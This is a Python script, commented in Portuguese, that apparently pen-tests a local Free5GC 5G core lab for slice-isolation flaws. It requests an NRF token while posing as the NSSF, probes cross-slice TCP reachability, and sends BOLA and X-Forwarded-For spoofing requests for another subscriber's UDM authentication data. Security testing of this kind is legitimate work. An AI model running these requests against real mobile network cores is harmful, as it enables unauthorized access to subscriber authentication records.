import requests
import urllib3
import json
import socket
import time

#--- Configurações de Ambiente (Valores dos seus arquivos .yaml) ---
#Os IPs e portas são baseados nos arquivos de configuração do seu Free5GC.
NF_CONFIG = {
    "NRF_IP": "127.0.0.10",
    "NRF_PORT": 8000,
    "UDM_IP": "127.0.0.3",
    "UDM_PORT": 8000,
    "SUPI_1": "208930000000001",
    "SUPI_2": "208930000000002"
}

UDM_API_URL_BASE = f"http://{NF_CONFIG['UDM_IP']}:{NF_CONFIG['UDM_PORT']}/nudm-uecm/v1/ues"

#Desabilitar avisos de certificados autoassinados (não é estritamente necessário para HTTP)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def get_access_token():
    """Tenta obter um token de acesso de uma NF."""
    auth_url = f"http://{NF_CONFIG['NRF_IP']}:{NF_CONFIG['NRF_PORT']}/nnrf-nfm/v1/oauth2/token"
    auth_headers = {"Content-Type": "application/x-www-form-urlencoded"}
    auth_data = "grant_type=client_credentials&client_id=NSSF"
    try:
        response = requests.post(auth_url, headers=auth_headers, data=auth_data, timeout=5)
        response.raise_for_status()
        return response.json().get("access_token")
    except (requests.exceptions.RequestException, KeyError) as e:
        return None

def test_connectivity(slice_a_ip, slice_b_ip, slice_b_port):
    """Testa a conectividade TCP básica entre as slices."""
    print(f"[*] Testando conectividade TCP entre slices (de {slice_a_ip} para {slice_b_ip}:{slice_b_port})...")
    try:
        #A API de socket testa a conectividade TCP básica, que deveria ser bloqueada entre slices
        socket.create_connection((slice_b_ip, slice_b_port), timeout=3).close()
        print(f"[!!!] VULNERABILIDADE DETECTADA: Um host na Slice A pode se conectar à Slice B.")
        return True
    except (socket.timeout, socket.error):
        print("[+] Conexão TCP para a Slice B falhou. A segmentação de rede parece correta.")
        return False

def test_bola(token, test_supi, test_case_name):
    """Testa o bypass de autorização inter-slices (BOLA)."""
    print(f"[*] Testando Bypass de Autorização inter-slices: '{test_case_name}'...")
    headers = {"Authorization": f"Bearer {token}"}
    api_url = f"{UDM_API_URL_BASE}/imsi-{test_supi}/authentications"
    
    try:
        response = requests.get(api_url, headers=headers, timeout=5)
        if response.status_code in [200, 201]:
            print("[!!!] VULNERABILIDADE DETECTADA: Bypass de autorização inter-slice!")
            return True
        elif response.status_code in [401, 403]:
            print("[+] Bypass de autorização falhou (acesso negado).")
            return False
        else:
            print(f"[-] Resposta inesperada. Status: {response.status_code}")
            return False
    except requests.exceptions.RequestException as e:
        print(f"[-] Erro ao tentar acessar a API da Slice B: {e}")
        return False

def test_spoofing(token, spoof_ip, other_supi):
    """
    Testa o spoofing de IP, um conceito de rede.
    A biblioteca `requests` não permite spoofing de IP de origem.
    O teste abaixo é conceitual e usa o cabeçalho `X-Forwarded-For`.
    """
    print(f"[*] Testando Spoofing de IP (conceitual) com IP de origem: {spoof_ip}...")
    headers = {"Authorization": f"Bearer {token}", "X-Forwarded-For": spoof_ip}
    api_url = f"{UDM_API_URL_BASE}/imsi-{other_supi}/authentications"

    try:
        response = requests.get(api_url, headers=headers, timeout=5)
        if response.status_code in [200, 201]:
            print("[!!!] VULNERABILIDADE DETECTADA: O servidor confiou em um cabeçalho spoofed e permitiu o acesso.")
            return True
        else:
            print("[+] O servidor não confiou no cabeçalho X-Forwarded-For. Teste de spoofing concluído.")
            return False
    except requests.exceptions.RequestException as e:
        print(f"[-] Erro ao tentar o spoofing: {e}")
        return False

if __name__ == "__main__":
    print("=" * 50)
    print("EXTRA - Testando Falhas de Segmentação de Rede (Network Slicing)")
    print("=" * 50)

    #Dataset de testes
    test_cases = [
        {"name": "Conectividade TCP", "type": "connectivity", "ip_a": NF_CONFIG['NRF_IP'], "ip_b": NF_CONFIG['UDM_IP'], "port": NF_CONFIG['UDM_PORT']},
        {"name": "Bypass de Autorização (SUPI 2)", "type": "bola", "target_supi": NF_CONFIG['SUPI_2']},
        {"name": "Spoofing de IP (Ataque Conceitual)", "type": "spoofing", "spoof_ip": "172.16.0.118", "target_supi": NF_CONFIG['SUPI_2']}
    ]

    token = get_access_token()
    if not token:
        print("[-] Não foi possível obter o token, os testes de bypass não podem continuar.")
    
    for case in test_cases:
        if case["type"] == "connectivity":
            test_connectivity(case["ip_a"], case["ip_b"], case["port"])
        elif case["type"] == "bola" and token:
            test_bola(token, case["target_supi"], case["name"])
        elif case["type"] == "spoofing" and token:
            test_spoofing(token, case["spoof_ip"], case["target_supi"])